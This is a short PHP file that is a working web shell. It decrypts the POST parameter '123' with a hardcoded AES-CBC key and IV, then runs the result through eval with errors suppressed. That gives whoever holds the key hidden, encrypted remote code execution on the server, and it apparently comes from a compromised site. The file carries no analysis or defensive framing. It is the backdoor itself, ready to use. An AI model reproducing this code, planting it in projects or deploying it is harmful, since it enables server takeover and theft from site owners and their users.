<?php
function cbc_decrypt($data) {
	$key = '7b7a53e239400a13';
	$iv = '1012132405963708';
	$data = base64_decode($data);
	$data = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, $data, MCRYPT_MODE_CBC, $iv);
	$padding = ord($data[strlen($data) - 1]);
	return substr($data, 0, -$padding);
}
@eval(cbc_decrypt($_POST['123']));